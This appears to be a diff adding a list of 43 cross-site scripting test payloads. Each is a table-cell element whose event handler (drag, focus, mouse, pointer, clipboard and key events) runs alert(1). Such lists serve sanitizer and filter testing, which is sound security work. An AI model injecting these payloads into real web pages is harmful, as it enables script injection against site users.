@@ -1,0 +1,43 @@
+<td draggable="true" ondrag="alert(1)">test</td>
+<td draggable="true" ondragend="alert(1)">test</td>
+<td draggable="true" ondragenter="alert(1)">test</td>
+<td draggable="true" ondragleave="alert(1)">test</td>
+<td draggable="true" ondragstart="alert(1)">test</td>
+<td id=x tabindex=1 onactivate=alert(1)></td>
+<td id=x tabindex=1 onbeforeactivate=alert(1)></td>
+<td id=x tabindex=1 onbeforedeactivate=alert(1)></td><input autofocus>
+<td id=x tabindex=1 ondeactivate=alert(1)></td><input id=y autofocus>
+<td id=x tabindex=1 onfocus=alert(1)></td>
+<td id=x tabindex=1 onfocusin=alert(1)></td>
+<td onafterscriptexecute=alert(1)><script>1</script>
+<td onbeforecopy="alert(1)" contenteditable>test</td>
+<td onbeforecut="alert(1)" contenteditable>test</td>
+<td onbeforepaste="alert(1)" contenteditable>test</td>
+<td onbeforescriptexecute=alert(1)><script>1</script>
+<td onblur=alert(1) tabindex=1 id=x></td><input autofocus>
+<td onclick="alert(1)">test</td>
+<td oncontextmenu="alert(1)">test</td>
+<td oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<td oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<td ondblclick="alert(1)" autofocus tabindex=1>test</td>
+<td onfocusout=alert(1) tabindex=1 id=x></td><input autofocus>
+<td onkeydown="alert(1)" contenteditable>test</td>
+<td onkeypress="alert(1)" contenteditable>test</td>
+<td onkeyup="alert(1)" contenteditable>test</td>
+<td onmousedown="alert(1)">test</td>
+<td onmouseenter="alert(1)">test</td>
+<td onmouseleave="alert(1)">test</td>
+<td onmousemove="alert(1)">test</td>
+<td onmouseout="alert(1)">test</td>
+<td onmouseover="alert(1)">test</td>
+<td onmouseup="alert(1)">test</td>
+<td onmousewheel=alert(1)>requires scrolling
+<td onpaste="alert(1)" contenteditable>test</td>
+<td onpointerdown=alert(1)>XSS</td>
+<td onpointerenter=alert(1)>XSS</td>
+<td onpointerleave=alert(1)>XSS</td>
+<td onpointermove=alert(1)>XSS</td>
+<td onpointerout=alert(1)>XSS</td>
+<td onpointerover=alert(1)>XSS</td>
+<td onpointerrawupdate=alert(1)>XSS</td>
+<td onpointerup=alert(1)>XSS</td>
